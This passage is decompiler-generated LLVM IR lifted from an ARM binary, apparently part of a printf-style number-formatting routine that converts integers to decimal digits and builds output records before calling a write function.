  %v0_19ee0 = load i32, i32* %r2.global-to-local, align 4
  %v1_19ee0 = inttoptr i32 %v0_19ee0 to i8*
  %v2_19ee0 = load i8, i8* %v1_19ee0, align 1
  %v3_19ee0 = zext i8 %v2_19ee0 to i32
  store i32 %v3_19ee0, i32* %r3.global-to-local, align 4
  %v5_19ee0 = add i32 %v0_19ee0, 1
  store i32 %v5_19ee0, i32* %r2.global-to-local, align 4
  %v1_19ee4 = icmp slt i32 %v1_19f7030, 0
  %v2_19ee4 = icmp eq i32 %v1_19f7030, 0
  store i1 %v2_19ee4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r5.global-to-local, align 4
  store i32 %v5_19ee0, i32* %r6.global-to-local, align 4
  store i32 %v3_19ee0, i32* %stack_var_-42, align 4
  %v2_19ef8 = sub i32 %v1_19ef8, %v5_19ee0
  store i32 %v2_19ef8, i32* %ip.global-to-local, align 4
  br i1 %v1_19ee4, label %.thread, label %dec_label_pc_19f04

.thread:                                          ; preds = %dec_label_pc_19ec8
  %v5_19efc = ptrtoint i32* %stack_var_-156 to i32
  store i32 %v5_19efc, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_19f80

dec_label_pc_19f04:                               ; preds = %dec_label_pc_19ec8
  store i32 112, i32* %r3.global-to-local, align 4
  %v2_19f08 = sub i32 %v1_19f7030, %v2_19ef8
  %v4_19f08 = xor i32 %v2_19ef8, %v1_19f7030
  %v5_19f08 = xor i32 %v2_19f08, %v1_19f7030
  %v6_19f08 = and i32 %v5_19f08, %v4_19f08
  %v7_19f08 = icmp slt i32 %v6_19f08, 0
  %v8_19f08 = icmp slt i32 %v2_19f08, 0
  %v9_19f08 = icmp eq i32 %v1_19f7030, %v2_19ef8
  store i1 %v9_19f08, i1* %cpsr_z.global-to-local, align 1
  store i32 112, i32* %stack_var_-156, align 4
  %v2_19f14 = xor i1 %v8_19f08, %v7_19f08
  br i1 %v2_19f14, label %dec_label_pc_19f60, label %dec_label_pc_19f18

dec_label_pc_19f18:                               ; preds = %dec_label_pc_19f04
  store i32 %v2_19f08, i32* %r2.global-to-local, align 4
  %v2_19f1c = icmp eq i32 %v2_19f08, 0
  store i1 %v2_19f1c, i1* %cpsr_z.global-to-local, align 1
  %v2_19f20 = ptrtoint i32* %stack_var_-180 to i32
  store i32 %v2_19f20, i32* %lr.global-to-local, align 4
  %tmp241 = icmp slt i32 %v2_19f08, 1
  br i1 %tmp241, label %.thread148, label %dec_label_pc_19f34

.thread148:                                       ; preds = %dec_label_pc_19f18
  %v7_19f28 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v7_19f28, i32* %r7.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %.thread34

dec_label_pc_19f34:                               ; preds = %dec_label_pc_19f18
  store i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 -34453), i32* %r3.global-to-local, align 4
  %v2_19f44 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_19f44, i32* %r7.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 -1, i32* %r1.global-to-local, align 4
  store i32 176, i32* %stack_var_-144, align 4
  br label %dec_label_pc_19f80

dec_label_pc_19f60:                               ; preds = %dec_label_pc_19f04
  store i1 %v2_19ee4, i1* %cpsr_z.global-to-local, align 1
  %v2_19f64 = ptrtoint i32* %stack_var_-180 to i32
  store i32 %v2_19f64, i32* %lr.global-to-local, align 4
  br i1 %v2_19ee4, label %bb242, label %bb243

bb242:                                            ; preds = %dec_label_pc_19f60
  %v3_19f6c = ptrtoint i32* %stack_var_-156 to i32
  store i32 %v3_19f6c, i32* %r7.global-to-local, align 4
  br label %.thread34

bb243:                                            ; preds = %dec_label_pc_19f60
  %v3_19f70 = sub i32 %v2_19ef8, %v1_19f7030
  store i32 %v3_19f70, i32* %ip.global-to-local, align 4
  %v3_19f7463 = add i32 %v5_19ee0, %v1_19f7030
  store i32 %v3_19f7463, i32* %r6.global-to-local, align 4
  %v3_19f78 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v3_19f78, i32* %r7.global-to-local, align 4
  br label %.thread34

.thread34:                                        ; preds = %.thread148, %bb242, %bb243
  %v1_19fc0265 = phi i32 [ %v3_19f6c, %bb242 ], [ %v3_19f78, %bb243 ], [ %v7_19f28, %.thread148 ]
  %v0_19f94102 = phi i32 [ %v2_19ef8, %bb242 ], [ %v3_19f70, %bb243 ], [ 0, %.thread148 ]
  store i32 -1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_19f80

dec_label_pc_19f80:                               ; preds = %.thread, %dec_label_pc_19f34, %.thread34
  %v1_19fc0 = phi i32 [ %v2_19f44, %dec_label_pc_19f34 ], [ %v1_19fc0265, %.thread34 ], [ %v5_19efc, %.thread ]
  %v0_19fd4109 = phi i32 [ -1, %dec_label_pc_19f34 ], [ -1, %.thread34 ], [ %v1_19f7030, %.thread ]
  %v0_19f94 = phi i32 [ 0, %dec_label_pc_19f34 ], [ %v0_19f94102, %.thread34 ], [ %v2_19ef8, %.thread ]
  %v3_19f80 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_19f80, i32* %r2.global-to-local, align 4
  %v1_19f84 = add i32 %v3_19f80, 12
  %v2_19f84 = inttoptr i32 %v1_19f84 to i32*
  %v3_19f84 = load i32, i32* %v2_19f84, align 4
  %v1_19f88 = and i32 %v3_19f84, 16
  store i32 %v1_19f88, i32* %r4.global-to-local, align 4
  %v2_19f88 = icmp eq i32 %v1_19f88, 0
  %tmp270 = zext i1 %v2_19f88 to i32
  %.259 = xor i32 %tmp270, 1
  store i32 %.259, i32* %r3.global-to-local, align 4
  %v2_19f94 = icmp eq i32 %v0_19f94, 0
  store i1 %v2_19f94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19f94, label %bb246, label %.thread37

.thread37:                                        ; preds = %dec_label_pc_19f80
  store i32 1, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_19fb0

bb246:                                            ; preds = %dec_label_pc_19f80
  store i1 %v2_19f88, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19f88, label %dec_label_pc_19fa4, label %dec_label_pc_19fb0

dec_label_pc_19fa4:                               ; preds = %bb246
  %v0_19fa4 = load i32, i32* %sb.global-to-local, align 4
  %v7_19fa4 = icmp eq i32 %v0_19fa4, 103
  store i1 %v7_19fa4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19fa4, label %dec_label_pc_19fd4, label %bb247

bb247:                                            ; preds = %dec_label_pc_19fa4
  %v1_19fa8 = load i32, i32* %fp.global-to-local, align 4
  %v3_19fa8 = icmp eq i32 %v1_19fa8, 0
  store i1 %v3_19fa8, i1* %cpsr_z.global-to-local, align 1
  %tmp248 = icmp slt i32 %v1_19fa8, 1
  br i1 %tmp248, label %dec_label_pc_19fd4, label %dec_label_pc_19fb0

dec_label_pc_19fb0:                               ; preds = %.thread37, %bb246, %bb247
  store i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32* %lr.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 -34456), i32* %r3.global-to-local, align 4
  %v2_19fc0 = inttoptr i32 %v1_19fc0 to i32*
  store i32 112, i32* %v2_19fc0, align 4
  %v0_19fc4 = load i32, i32* %r3.global-to-local, align 4
  %v1_19fc4 = add i32 %v0_19fc4, 16
  store i32 %v1_19fc4, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v0_19fcc = load i32, i32* %r7.global-to-local, align 4
  %v1_19fcc = add i32 %v0_19fcc, 4
  %v2_19fcc = inttoptr i32 %v1_19fcc to i32*
  store i32 1, i32* %v2_19fcc, align 4
  %v4_19fcc = add i32 %v0_19fcc, 8
  %v5_19fcc = inttoptr i32 %v4_19fcc to i32*
  %v6_19fcc = load i32, i32* %r3.global-to-local, align 4
  store i32 %v6_19fcc, i32* %v5_19fcc, align 4
  %v0_19fd0 = load i32, i32* %r7.global-to-local, align 4
  %v1_19fd0 = add i32 %v0_19fd0, 12
  store i32 %v1_19fd0, i32* %r7.global-to-local, align 4
  %v0_19fd4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_19fd4

dec_label_pc_19fd4:                               ; preds = %dec_label_pc_19fa4, %bb247, %dec_label_pc_19fb0
  %v1_19ff4 = phi i32 [ %v1_19fc0, %bb247 ], [ %v1_19fd0, %dec_label_pc_19fb0 ], [ %v1_19fc0, %dec_label_pc_19fa4 ]
  %v0_19fd4 = phi i32 [ %v0_19fd4109, %bb247 ], [ %v0_19fd4.pre, %dec_label_pc_19fb0 ], [ %v0_19fd4109, %dec_label_pc_19fa4 ]
  %v1_19fd4 = add i32 %v0_19fd4, 1
  store i32 %v1_19fd4, i32* %lr.global-to-local, align 4
  %v6_19fd4 = icmp slt i32 %v1_19fd4, 0
  %v7_19fd4 = icmp eq i32 %v1_19fd4, 0
  store i1 %v7_19fd4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v6_19fd4, label %dec_label_pc_19fdc, label %dec_label_pc_1a000

dec_label_pc_19fdc:                               ; preds = %dec_label_pc_19fd4
  store i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 -34453), i32* %r3.global-to-local, align 4
  %v1_19fec = sub i32 -1, %v0_19fd4
  store i32 %v1_19fec, i32* %r1.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  %v2_19ff4 = inttoptr i32 %v1_19ff4 to i32*
  store i32 176, i32* %v2_19ff4, align 4
  %v0_19ff8 = load i32, i32* %r7.global-to-local, align 4
  %v1_19ff8 = add i32 %v0_19ff8, 4
  %v2_19ff8 = inttoptr i32 %v1_19ff8 to i32*
  %v3_19ff8 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v3_19ff8, i32* %v2_19ff8, align 4
  %v4_19ff8 = add i32 %v0_19ff8, 8
  %v5_19ff8 = inttoptr i32 %v4_19ff8 to i32*
  %v6_19ff8 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v6_19ff8, i32* %v5_19ff8, align 4
  %v0_19ffc = load i32, i32* %r7.global-to-local, align 4
  %v1_19ffc = add i32 %v0_19ffc, 12
  store i32 %v1_19ffc, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1a000

dec_label_pc_1a000:                               ; preds = %dec_label_pc_19fd4, %dec_label_pc_19fdc
  %v2_1a008 = phi i32 [ %v1_19ff4, %dec_label_pc_19fd4 ], [ %v1_19ffc, %dec_label_pc_19fdc ]
  %v0_1a000 = load i32, i32* %ip.global-to-local, align 4
  %v2_1a000 = icmp eq i32 %v0_1a000, 0
  store i1 %v2_1a000, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a000, label %.thread46, label %bb249

bb249:                                            ; preds = %dec_label_pc_1a000
  store i32 112, i32* %r3.global-to-local, align 4
  %v3_1a008 = inttoptr i32 %v2_1a008 to i32*
  store i32 112, i32* %v3_1a008, align 4
  %v1_1a00c = load i32, i32* %r6.global-to-local, align 4
  %v2_1a00c = load i32, i32* %r7.global-to-local, align 4
  %v3_1a00c = add i32 %v2_1a00c, 8
  %v4_1a00c = inttoptr i32 %v3_1a00c to i32*
  store i32 %v1_1a00c, i32* %v4_1a00c, align 4
  %v1_1a010 = load i32, i32* %ip.global-to-local, align 4
  %v2_1a010 = load i32, i32* %r7.global-to-local, align 4
  %v3_1a010 = add i32 %v2_1a010, 4
  %v4_1a010 = inttoptr i32 %v3_1a010 to i32*
  store i32 %v1_1a010, i32* %v4_1a010, align 4
  %v1_1a014 = load i32, i32* %r7.global-to-local, align 4
  %v2_1a014 = add i32 %v1_1a014, 12
  store i32 %v2_1a014, i32* %r7.global-to-local, align 4
  br label %.thread46

.thread46:                                        ; preds = %dec_label_pc_1a000, %bb249
  %v1_1a04c = phi i32 [ %v2_1a008, %dec_label_pc_1a000 ], [ %v2_1a014, %bb249 ]
  %v0_1a018 = load i32, i32* %sb.global-to-local, align 4
  %v7_1a018 = icmp eq i32 %v0_1a018, 103
  store i1 %v7_1a018, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a018, label %dec_label_pc_1a020, label %dec_label_pc_1a028

dec_label_pc_1a020:                               ; preds = %.thread46
  %v0_1a020 = load i32, i32* %r4.global-to-local, align 4
  %v2_1a020 = icmp eq i32 %v0_1a020, 0
  store i1 %v2_1a020, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a020, label %dec_label_pc_1a058, label %dec_label_pc_1a028

dec_label_pc_1a028:                               ; preds = %.thread46, %dec_label_pc_1a020
  %v0_1a028 = load i32, i32* %lr.global-to-local, align 4
  %v1_1a028 = load i32, i32* %ip.global-to-local, align 4
  %v2_1a028 = sub i32 %v1_1a028, %v0_1a028
  store i32 %v2_1a028, i32* %r1.global-to-local, align 4
  %v1_1a02c = load i32, i32* %fp.global-to-local, align 4
  %v2_1a02c = sub i32 %v2_1a028, %v1_1a02c
  %v4_1a02c = xor i32 %v1_1a02c, %v2_1a028
  %v5_1a02c = xor i32 %v2_1a02c, %v2_1a028
  %v6_1a02c = and i32 %v5_1a02c, %v4_1a02c
  %v7_1a02c = icmp slt i32 %v6_1a02c, 0
  %v8_1a02c = icmp slt i32 %v2_1a02c, 0
  %v9_1a02c = icmp eq i32 %v2_1a028, %v1_1a02c
  store i1 %v9_1a02c, i1* %cpsr_z.global-to-local, align 1
  %v2_1a030 = xor i1 %v8_1a02c, %v7_1a02c
  br i1 %v2_1a030, label %dec_label_pc_1a034, label %dec_label_pc_1a058

dec_label_pc_1a034:                               ; preds = %dec_label_pc_1a028
  %v2_1a040 = sub i32 %v1_1a02c, %v2_1a028
  store i32 %v2_1a040, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 -34453), i32* %r3.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  %v2_1a04c = inttoptr i32 %v1_1a04c to i32*
  store i32 176, i32* %v2_1a04c, align 4
  %v0_1a050 = load i32, i32* %r7.global-to-local, align 4
  %v1_1a050 = add i32 %v0_1a050, 4
  %v2_1a050 = inttoptr i32 %v1_1a050 to i32*
  %v3_1a050 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v3_1a050, i32* %v2_1a050, align 4
  %v4_1a050 = add i32 %v0_1a050, 8
  %v5_1a050 = inttoptr i32 %v4_1a050 to i32*
  %v6_1a050 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v6_1a050, i32* %v5_1a050, align 4
  %v0_1a054 = load i32, i32* %r7.global-to-local, align 4
  %v1_1a054 = add i32 %v0_1a054, 12
  store i32 %v1_1a054, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1a058

dec_label_pc_1a058:                               ; preds = %dec_label_pc_1a028, %dec_label_pc_1a020, %dec_label_pc_1a034
  %v1_1a0ec.pre.pre = phi i32 [ %v1_1a04c, %dec_label_pc_1a028 ], [ %v1_1a04c, %dec_label_pc_1a020 ], [ %v1_1a054, %dec_label_pc_1a034 ]
  %v0_1a058 = load i32, i32* %r8.global-to-local, align 4
  %v7_1a058 = icmp eq i32 %v0_1a058, 102
  store i1 %v7_1a058, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a058, label %dec_label_pc_1a0e0, label %dec_label_pc_1a060

dec_label_pc_1a060:                               ; preds = %dec_label_pc_1a058
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_1a064 = load i32, i32* %r0.global-to-local, align 4
  %v1_1a064 = icmp slt i32 %v0_1a064, 0
  %v2_1a064 = icmp eq i32 %v0_1a064, 0
  store i1 %v2_1a064, i1* %cpsr_z.global-to-local, align 1
  %v4_1a068 = select i1 %tmp275, i32 %v4_19d84126130, i32 101
  store i32 %v4_1a068, i32* %r4.global-to-local, align 4
  store i32 0, i32* %stack_var_-47, align 4
  %v4_1a078 = sub i32 0, %v0_1a064
  %storemerge158 = select i1 %v1_1a064, i32 %v4_1a078, i32 %v0_1a064
  %tmp271 = ashr i32 %v0_1a064, 31
  %tmp272 = and i32 %tmp271, 2
  %tmp273 = add nuw nsw i32 %tmp272, 43
  store i32 %storemerge158, i32* %r5.global-to-local, align 4
  store i32 %tmp273, i32* %sl.global-to-local, align 4
  %v2_1a080 = ptrtoint i32* %stack_var_-47 to i32
  store i32 %v2_1a080, i32* %r6.global-to-local, align 4
  store i32 2, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1a088

dec_label_pc_1a088:                               ; preds = %dec_label_pc_1a0b8, %dec_label_pc_1a088, %dec_label_pc_1a060
  %v2_1a0a0 = phi i32 [ %v2_1a080, %dec_label_pc_1a060 ], [ %v6_1a0a0, %dec_label_pc_1a088 ], [ %v6_1a0a0, %dec_label_pc_1a0b8 ]
  %v0_1a098 = phi i32 [ %storemerge158, %dec_label_pc_1a060 ], [ %v2_1a0a4, %dec_label_pc_1a088 ], [ %v2_1a0a4, %dec_label_pc_1a0b8 ]
  %v3_1a090 = urem i32 %v0_1a098, 10
  %v1_1a094 = or i32 %v3_1a090, 48
  store i32 %v1_1a094, i32* %r3.global-to-local, align 4
  store i32 %v0_1a098, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v1_1a0a0 = trunc i32 %v1_1a094 to i8
  %v3_1a0a0 = add i32 %v2_1a0a0, -1
  %v4_1a0a0 = inttoptr i32 %v3_1a0a0 to i8*
  store i8 %v1_1a0a0, i8* %v4_1a0a0, align 1
  %v5_1a0a0 = load i32, i32* %r6.global-to-local, align 4
  %v6_1a0a0 = add i32 %v5_1a0a0, -1
  store i32 %v6_1a0a0, i32* %r6.global-to-local, align 4
  %v0_1a0a4 = load i32, i32* %r0.global-to-local, align 4
  %v1_1a0a4 = load i32, i32* %r1.global-to-local, align 4
  %v2_1a0a4 = sdiv i32 %v0_1a0a4, %v1_1a0a4
  store i32 %v2_1a0a4, i32* %r0.global-to-local, align 4
  %v0_1a0a8 = load i32, i32* %r8.global-to-local, align 4
  %v1_1a0a8 = add i32 %v0_1a0a8, 1
  store i32 %v1_1a0a8, i32* %r8.global-to-local, align 4
  %v7_1a0ac = icmp eq i32 %v1_1a0a8, 3
  store i1 %v7_1a0ac, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_1a0a4, i32* %r5.global-to-local, align 4
  br i1 %v7_1a0ac, label %dec_label_pc_1a088, label %dec_label_pc_1a0b8

dec_label_pc_1a0b8:                               ; preds = %dec_label_pc_1a088
  %v2_1a0b8 = icmp eq i32 %v2_1a0a4, 0
  store i1 %v2_1a0b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a0b8, label %dec_label_pc_1a0c0, label %dec_label_pc_1a088

dec_label_pc_1a0c0:                               ; preds = %dec_label_pc_1a0b8
  %v1_1a0c0 = add i32 %v5_1a0a0, -2
  store i32 %v1_1a0c0, i32* %r3.global-to-local, align 4
  %v0_1a0c4 = load i32, i32* %sl.global-to-local, align 4
  %v1_1a0c4 = trunc i32 %v0_1a0c4 to i8
  %v4_1a0c4 = inttoptr i32 %v1_1a0c0 to i8*
  store i8 %v1_1a0c4, i8* %v4_1a0c4, align 1
  %v0_1a0c8 = load i32, i32* %r3.global-to-local, align 4
  %v1_1a0c8 = add i32 %v0_1a0c8, -1
  store i32 %v1_1a0c8, i32* %r2.global-to-local, align 4
  %v0_1a0cc = load i32, i32* %r4.global-to-local, align 4
  %v1_1a0cc = trunc i32 %v0_1a0cc to i8
  %v4_1a0cc = inttoptr i32 %v1_1a0c8 to i8*
  store i8 %v1_1a0cc, i8* %v4_1a0cc, align 1
  store i32 112, i32* %r3.global-to-local, align 4
  %v0_1a0d4 = load i32, i32* %r7.global-to-local, align 4
  %v1_1a0d4 = inttoptr i32 %v0_1a0d4 to i32*
  store i32 112, i32* %v1_1a0d4, align 4
  %v3_1a0d4 = add i32 %v0_1a0d4, 4
  %v4_1a0d4 = inttoptr i32 %v3_1a0d4 to i32*
  %v5_1a0d4 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v5_1a0d4, i32* %v4_1a0d4, align 4
  %v0_1a0d8 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a0d8 = load i32, i32* %r7.global-to-local, align 4
  %v2_1a0d8 = add i32 %v1_1a0d8, 8
  %v3_1a0d8 = inttoptr i32 %v2_1a0d8 to i32*
  store i32 %v0_1a0d8, i32* %v3_1a0d8, align 4
  %v0_1a0dc = load i32, i32* %r7.global-to-local, align 4
  %v1_1a0dc = add i32 %v0_1a0dc, 12
  store i32 %v1_1a0dc, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1a0e0

dec_label_pc_1a0e0:                               ; preds = %dec_label_pc_1a058, %.thread124, %dec_label_pc_1a0c0
  %v1_1a0ec.pre = phi i32 [ %v2_19bb8, %.thread124 ], [ %v1_1a0dc, %dec_label_pc_1a0c0 ], [ %v1_1a0ec.pre.pre, %dec_label_pc_1a058 ]
  %v2_1a0e0 = ptrtoint i32* %stack_var_-164 to i32
  store i32 %v2_1a0e0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1a0e4

dec_label_pc_1a0e4:                               ; preds = %dec_label_pc_1a0e4, %dec_label_pc_1a0e0
  %v0_1a0e4 = phi i32 [ %v2_1a0e0, %dec_label_pc_1a0e0 ], [ %v4_1a0e4, %dec_label_pc_1a0e4 ]
  %stack_var_-188.0 = phi i32 [ %v3_19a54, %dec_label_pc_1a0e0 ], [ %v2_1a0f0, %dec_label_pc_1a0e4 ]
  %v1_1a0e4 = inttoptr i32 %v0_1a0e4 to i32*
  %v2_1a0e4 = load i32, i32* %v1_1a0e4, align 4
  store i32 %v2_1a0e4, i32* %r3.global-to-local, align 4
  %v4_1a0e4 = add i32 %v0_1a0e4, 12
  store i32 %v4_1a0e4, i32* %r2.global-to-local, align 4
  %v3_1a0ec = icmp ult i32 %v4_1a0e4, %v1_1a0ec.pre
  %v2_1a0f0 = sub i32 %stack_var_-188.0, %v2_1a0e4
  store i32 %v2_1a0f0, i32* %ip.global-to-local, align 4
  br i1 %v3_1a0ec, label %dec_label_pc_1a0e4, label %dec_label_pc_1a0fc

dec_label_pc_1a0fc:                               ; preds = %dec_label_pc_1a0e4
  %v3_1a0fc = load i8, i8* %stack_var_-46, align 1
  %v4_1a0fc = sext i8 %v3_1a0fc to i32
  store i32 %v4_1a0fc, i32* %r3.global-to-local, align 4
  store i32 %v4_1a0fc, i32* %r2.global-to-local, align 4
  %v2_1a100 = icmp eq i8 %v3_1a0fc, 0
  store i1 %v2_1a100, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a100, label %bb254, label %bb253

bb253:                                            ; preds = %dec_label_pc_1a0fc
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb254

bb254:                                            ; preds = %dec_label_pc_1a0fc, %bb253
  %v1_1a160 = phi i32 [ %v4_1a0fc, %dec_label_pc_1a0fc ], [ 1, %bb253 ]
  %v2_1a108 = sub i32 %v2_1a0f0, %v1_1a160
  store i32 %v2_1a108, i32* %r1.global-to-local, align 4
  store i32 160, i32* %r0.global-to-local, align 4
  %v2_1a110 = ptrtoint i8* %stack_var_-46 to i32
  store i32 %v2_1a110, i32* %r3.global-to-local, align 4
  %v2_1a114 = icmp eq i32 %v2_1a108, 0
  store i1 %v2_1a114, i1* %cpsr_z.global-to-local, align 1
  store i32 160, i32* %stack_var_-180, align 4
  %tmp255 = icmp slt i32 %v2_1a108, 1
  br i1 %tmp255, label %dec_label_pc_1a17c, label %dec_label_pc_1a128

dec_label_pc_1a128:                               ; preds = %bb254
  %v3_1a128 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_1a128, i32* %lr.global-to-local, align 4
  %v1_1a12c = add i32 %v3_1a128, 12
  %v2_1a12c = inttoptr i32 %v1_1a12c to i32*
  %v3_1a12c = load i32, i32* %v2_1a12c, align 4
  store i32 %v3_1a12c, i32* %r3.global-to-local, align 4
  %v1_1a130 = and i32 %v3_1a12c, 8
  %v2_1a130 = icmp eq i32 %v1_1a130, 0
  store i1 %v2_1a130, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a130, label %dec_label_pc_1a154, label %dec_label_pc_1a138

dec_label_pc_1a138:                               ; preds = %dec_label_pc_1a128
  store i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32* %r2.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 -34453), i32* %r3.global-to-local, align 4
  %v1_1a148 = add i32 %v1_1a0ec.pre, 12
  store i32 %v1_1a148, i32* %r6.global-to-local, align 4
  %v1_1a14c = inttoptr i32 %v1_1a0ec.pre to i32*
  store i32 160, i32* %v1_1a14c, align 4
  %v3_1a14c = add i32 %v1_1a0ec.pre, 4
  %v4_1a14c = inttoptr i32 %v3_1a14c to i32*
  %v5_1a14c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1a14c, i32* %v4_1a14c, align 4
  %v6_1a14c = add i32 %v1_1a0ec.pre, 8
  %v7_1a14c = inttoptr i32 %v6_1a14c to i32*
  %v8_1a14c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v8_1a14c, i32* %v7_1a14c, align 4
  br label %dec_label_pc_1a180

dec_label_pc_1a154:                               ; preds = %dec_label_pc_1a128
  store i32 %v3_1a128, i32* %ip.global-to-local, align 4
  %v1_1a158 = add i32 %v3_1a128, 16
  %v2_1a158 = inttoptr i32 %v1_1a158 to i32*
  %v3_1a158 = load i32, i32* %v2_1a158, align 4
  store i32 %v3_1a158, i32* %r3.global-to-local, align 4
  %v7_1a15c = icmp eq i32 %v3_1a158, 48
  store i1 %v7_1a15c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a15c, label %.thread54.thread70, label %bb256

bb256:                                            ; preds = %dec_label_pc_1a154
  store i32 %v2_1a0f0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1a17c

.thread54.thread70:                               ; preds = %dec_label_pc_1a154
  %v4_1a168 = load i32, i32* %stack_var_-164, align 4
  store i32 %v1_1a0ec.pre, i32* %r6.global-to-local, align 4
  %v3_1a170 = add i32 %v4_1a168, %v2_1a108
  store i32 %v3_1a170, i32* %r3.global-to-local, align 4
  store i32 %v3_1a170, i32* %stack_var_-164, align 4
  br label %dec_label_pc_1a180

dec_label_pc_1a17c:                               ; preds = %bb256, %bb254
  store i32 %v1_1a0ec.pre, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1a180

dec_label_pc_1a180:                               ; preds = %.thread54.thread70, %dec_label_pc_1a138, %dec_label_pc_1a17c
  store i32 0, i32* %r7.global-to-local, align 4
  %v2_1a184 = ptrtoint i32* %stack_var_-180 to i32
  store i32 %v2_1a184, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1a188

dec_label_pc_1a188:                               ; preds = %dec_label_pc_1a1b0, %dec_label_pc_1a180
  %v0_1a188 = phi i32 [ %v1_1a1a4, %dec_label_pc_1a1b0 ], [ %v2_1a184, %dec_label_pc_1a180 ]
  %v1_1a188 = inttoptr i32 %v0_1a188 to i32*
  %v2_1a188 = load i32, i32* %v1_1a188, align 4
  store i32 %v2_1a188, i32* %r1.global-to-local, align 4
  %v3_1a188 = add i32 %v0_1a188, 4
  %v4_1a188 = inttoptr i32 %v3_1a188 to i32*
  %v5_1a188 = load i32, i32* %v4_1a188, align 4
  store i32 %v5_1a188, i32* %r2.global-to-local, align 4
  %v6_1a188 = add i32 %v0_1a188, 8
  %v7_1a188 = inttoptr i32 %v6_1a188 to i32*
  %v8_1a188 = load i32, i32* %v7_1a188, align 4
  store i32 %v8_1a188, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  store i32 %arg5, i32* @ip, align 4
  store i32 106908, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg5)
  %v0_1a19c = load i32, i32* %r5.global-to-local, align 4
  %v1_1a19c = add i32 %v0_1a19c, 4
  %v2_1a19c = inttoptr i32 %v1_1a19c to i32*
  %v3_1a19c = load i32, i32* %v2_1a19c, align 4
  store i32 %v3_1a19c, i32* %r3.global-to-local, align 4
  %v0_1a1a0 = load i32, i32* %r0.global-to-local, align 4
  %v9_1a1a0 = icmp eq i32 %v0_1a1a0, %v3_1a19c
  store i1 %v9_1a1a0, i1* %cpsr_z.global-to-local, align 1
  %v1_1a1a4 = add i32 %v0_1a19c, 12
  store i32 %v1_1a1a4, i32* %r5.global-to-local, align 4
  br i1 %v9_1a1a0, label %dec_label_pc_1a1b0, label %bb257

bb257:                                            ; preds = %dec_label_pc_1a188
  store i32 -1, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1a1d0

dec_label_pc_1a1b0:                               ; preds = %dec_label_pc_1a188
  %v0_1a1b4.pre = load i32, i32* %r7.global-to-local, align 4
  %v1_1a1b0 = load i32, i32* %r6.global-to-local, align 4
  %v3_1a1b0 = icmp ult i32 %v1_1a1a4, %v1_1a1b0
  %v9_1a1b0 = icmp eq i32 %v1_1a1a4, %v1_1a1b0
  store i1 %v9_1a1b0, i1* %cpsr_z.global-to-local, align 1
  %v2_1a1b4 = add i32 %v0_1a1b4.pre, %v3_1a19c
  store i32 %v2_1a1b4, i32* %r7.global-to-local, align 4
  br i1 %v3_1a1b0, label %dec_label_pc_1a188, label %dec_label_pc_1a1d0

dec_label_pc_1a1c8:                               ; preds = %.thread21, %bb239
  %v0_1a1c8 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_1a1c8, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_19ec8

dec_label_pc_1a1d0:                               ; preds = %dec_label_pc_1a1b0, %bb257
